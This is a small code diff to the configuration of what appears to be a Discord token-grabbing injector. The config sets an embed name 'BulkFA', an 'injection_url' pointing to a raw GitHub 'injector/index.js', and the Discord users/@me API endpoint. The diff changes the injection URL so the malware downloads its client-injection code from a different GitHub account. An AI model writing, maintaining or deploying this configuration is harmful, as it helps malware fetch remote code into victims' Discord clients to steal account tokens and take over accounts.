@@ -14,7 +14,7 @@ const config = {
   embed_name: 'BulkFA', 
   embed_icon: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg',
   embed_color: 000000, 
-  injection_url: 'https://raw.githubusercontent.com/otar120/injector/main/index.js',
+  injection_url: 'https://raw.githubusercontent.com/godgod100/injector/main/index.js',
   api: 'https://discord.com/api/v9/users/@me',
   filter: {
     urls: [
